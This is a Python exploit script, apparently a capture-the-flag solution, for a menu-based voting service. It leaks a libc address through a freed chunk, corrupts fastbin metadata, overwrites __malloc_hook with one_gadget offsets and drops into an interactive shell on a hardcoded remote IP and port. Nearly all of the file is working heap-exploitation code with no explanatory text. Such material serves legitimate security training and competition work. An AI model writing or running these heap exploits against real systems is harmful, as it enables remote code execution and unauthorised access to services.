#!/usr/bin/env python3

from time import sleep
import socket
import sys
import telnetlib

def _p32(num):
    return num.to_bytes(4, byteorder='little')

def _p64(num):
    return num.to_bytes(8, byteorder='little')

def u32(byte_string):
    byte4 = byte_string.ljust(4, b'\0')
    return int.from_bytes(byte4, byteorder='little')

def u64(byte_string):
    byte8 = byte_string.ljust(8, b'\0')
    return int.from_bytes(byte8, byteorder='little')

def p32(*nums):
    data = b''
    for num in nums:
        data += _p32(num)
    return data

def p64(*nums):
    data = b''
    for num in nums:
        data += _p64(num)
    return data

# This is the modified version of interact() in telnetlib.
# It can receive non-ascii data.
# Original interact() is here:
#     https://github.com/python/cpython/blob/master/Lib/telnetlib.py
def _xinteract(tel):
    import selectors
    with telnetlib._TelnetSelector() as selector:
        selector.register(tel, selectors.EVENT_READ)
        selector.register(sys.stdin, selectors.EVENT_READ)

        while True:
            for key, events in selector.select():
                if key.fileobj is tel:
                    try:
                        text = tel.read_eager()
                    except EOFError:
                        print('*** Connection closed by remote host ***')
                        return
                    if text:
                        string = text.decode('ascii', 'backslashreplace')
                        sys.stdout.write(string)
                        sys.stdout.flush()
                elif key.fileobj is sys.stdin:
                    line = sys.stdin.readline().encode('ascii')
                    if not line:
                        return
                    tel.write(line)

class PwnSocket:
    def __init__(self, ip, port):
        self.silent_flag = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((ip, port))

    def shell(self):
        tel = telnetlib.Telnet()
        tel.sock = self.sock
        _xinteract(tel)
        #tel.interact()

    def print_bytes(self, byte_str):
        if not self.silent_flag:
            string = byte_str.decode('ascii', 'backslashreplace')
            sys.stdout.write(string)
            sys.stdout.flush()

    def send(self, message):
        self.print_bytes(message)
        self.sock.send(message)

    def send_str(self, string):
        self.send(string.encode('ascii'))

    def send_int(self, num):
        self.send_str(str(num) + '\n')

    def recv_until(self, delimiter_bytes):
        received_data = b''
        while not received_data.endswith(delimiter_bytes):
            tmp = self.sock.recv(1)
            self.print_bytes(tmp)
            received_data += tmp
        return received_data

    def recv(self, num):
        data = self.sock.recv(num)
        self.print_bytes(data)
        return data

    def set_silent(self):
        self.silent_flag = True

    def unset_silent(self):
        self.silent_flag = False

    def select_menu(self, num):
        self.recv_until(b'Action: ')
        self.send_int(num)

    def select_index(self, index):
        self.recv_until(b'index: ')
        self.send_int(index)

    def add(self, size, name):
        self.select_menu(0)
        self.recv_until(b'size: ')
        self.send_int(size)
        self.recv_until(b'name: ')
        if len(name) < size and name[:-1] != b'\n':
            self.send(name + b'\n')
        else:
            self.send(name)

    def show(self, index):
        self.select_menu(1)
        self.select_index(index)
        self.recv_until(b'name: ')
        name = self.recv_until(b'\n')[:-1]
        self.recv_until(b'count: ')
        count = self.recv_until(b'\n')[:-1]
        self.recv_until(b'time: ')
        timestamp = self.recv_until(b'\n')[:-1]
        return count

    def vote(self, index):
        self.select_menu(2)
        self.select_index(index)

    def result(self):
        self.select_menu(3)

    def cancel(self, index):
        self.select_menu(4)
        self.select_index(index)
        # receive the name of the freed candidate
        name = self.recv_until(b' ')[:-1]
        self.recv_until(b'\n')
        return name

    def exit(self):
        self.select_menu(5)

def main(target, one_gadget_offset):
    if target == 'remote':
        ip = '47.97.190.1'
        port = 6000
    else:
        hostname = 'localhost'
        ip = socket.gethostbyname(hostname)

    if target == 'debug':
        port = 12345
    elif target == 'no-debug':
        port = 23456

    leak_addr_gdb = 0x7ffff7bb4b78
    libc_base_gdb = 0x7ffff77f0000
    malloc_hook_gdb = 0x7ffff7bb4b10
    size_7f_gdb = 0x7ffff7bb4af0 + 5

    timeout = 0x1e
    min_size = 0x8
    small_size = 0x70 - 0x18
    large_size = 0x70 * 2 - 0x18
    small_name = b'small\n'
    large_name = b'large\n'

    ps = PwnSocket(ip, port)

    ps.add(large_size, large_name)
    ps.add(large_size, large_name)
    ps.cancel(0)
    ps.cancel(1)
    leak_addr = int(ps.show(0))
    libc_base = leak_addr - leak_addr_gdb + libc_base_gdb
    print('libc_base = {}'.format(hex(libc_base)))
    for i in range(9):
        ps.add(small_size, small_name)
        ps.vote(2)
        ps.cancel(2)
    large_chunk = b'A' * large_size + p64(small_size+0x18|1)
    large_chunk += b'B' * (small_size+0x10)
    ps.add(large_size, large_name)
    ps.add(large_size, large_name)
    ps.add(large_size, large_name)
    ps.add(large_size, large_name)
    ps.add(small_size, small_name)
    ps.add(small_size, small_name)
    ps.vote(4)
    ps.cancel(4)
    ps.cancel(5)
    ps.add(len(large_chunk), large_chunk)
    ps.vote(5)
    ps.cancel(5)
    ps.vote(4)
    ps.cancel(4)
    size_7f = libc_base - libc_base_gdb + size_7f_gdb
    target_addr = size_7f - 8
    large_chunk = b'A' * large_size + p64(small_size+0x18|1, target_addr)
    large_chunk += b'B' * (small_size+0x8)
    ps.add(len(large_chunk), large_chunk)
    ps.add(small_size, p64(0xcafebabe))
    one_gadget = libc_base + one_gadget_offset
    ps.add(small_size, b'A' * 3 + p64(one_gadget))
    #ps.result()

    ps.select_menu(0)
    ps.recv_until(b'size: ')
    ps.send(b'1\n')
    print('==== pwned ====')
    ps.shell()

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '--remote':
        target = 'remote'
        one_gadgets = [0x45216, 0x4526a, 0xf0274, 0xf1117]
    elif len(sys.argv) == 2 and sys.argv[1] == '--no-debug':
        target = 'no-debug'
        one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    else:
        target = 'debug'
        one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    for i in one_gadgets:
        main(target, i)
